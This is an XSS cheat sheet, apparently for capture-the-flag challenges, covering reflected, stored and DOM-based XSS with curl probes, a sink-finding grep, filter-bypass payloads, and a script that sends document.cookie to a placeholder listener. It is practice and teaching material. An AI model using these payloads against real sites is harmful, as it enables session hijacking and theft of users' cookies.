# Cross-Site Scripting (XSS)

## Fastest First-Pass Checklist

```bash
# Purpose: cheap reflected-XSS probe — see if input comes back unescaped
curl -s "https://target.example/search?q=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'

# Purpose: check response Content-Type — XSS needs text/html to execute as markup
curl -sI "https://target.example/search?q=test" | grep -i content-type
```

## Technique: Reflected XSS

**When to use it**: any parameter echoed back into an HTML response.

**Fast path**:
```bash
# Purpose: baseline payload to confirm no output encoding is applied
curl -s "https://target.example/search?q=<script>alert(document.domain)</script>"
```
**Indicators**: payload appears verbatim (unescaped) in the response body,
inside an HTML context (not inside a JSON string, not inside an already-
escaped attribute).

**Next Step (CTF-specific)**: since these challenges usually target a
"bot"/admin session rather than your own browser, weaponize toward
exfiltrating the bot's cookie/flag to a listener you control:
```html
<!-- Purpose: exfiltrate document.cookie (often where the flag/session lives) to an attacker-controlled endpoint -->
<script>fetch('https://YOUR_LISTENER/steal?c=' + document.cookie)</script>
```

## Technique: Stored XSS

**Indicators**: payload submitted once (e.g. a profile bio, comment) and
executes on every subsequent page load for anyone viewing that content —
higher impact than reflected since no per-victim link needs sending.

**Fast path**: submit the payload via the normal app feature (comment
form, profile field), then view the page as a different session/incognito
to confirm execution without re-submitting.

## Technique: DOM-Based XSS

**When to use it**: source code inspection (`source-code-analysis.md`)
shows client-side JS reading from `location.hash`/`location.search`/
`document.referrer` and writing to `innerHTML`/`document.write`/`eval`
without sanitization — this never touches the server, so `curl`-based
testing alone won't reveal it; needs a browser or a headless DOM.

**Fast path**:
```bash
# Purpose: identify dangerous sinks in JS source as a targeting step
grep -RnoE '\.innerHTML\s*=|document\.write\(|eval\(' ./*.js
```
Then manually load `https://target.example/page#<img src=x onerror=alert(1)>`
in a real browser to confirm.

## Technique: Filter / WAF Bypass

**Indicators**: naive payload blocked (`<script>` stripped) but the app
still reflects other tags/attributes.

**Fast path** (bypass candidates):
```html
<!-- Purpose: alternate event-handler-based payloads that avoid the literal <script> tag -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">click</a>
```
**Next Step**: if specific characters/keywords are stripped (not encoded),
try case variation (`OnErRoR`), null-byte/comment injection, or nested tags
that survive a naive strip-once filter (`<scr<script>ipt>`).

## Common Mistakes

- Testing with `curl` alone for DOM-based XSS, which never executes
  client-side JS — you'll get false negatives; use a real browser or
  headless JS engine for DOM sinks.
- Not checking the response Content-Type — a JSON API reflecting your
  payload isn't XSS unless something downstream renders it as HTML.
- Forgetting that stored XSS payloads persist across your testing —
  clean up test payloads so they don't pollute later stages of the
  challenge (or your own re-testing).
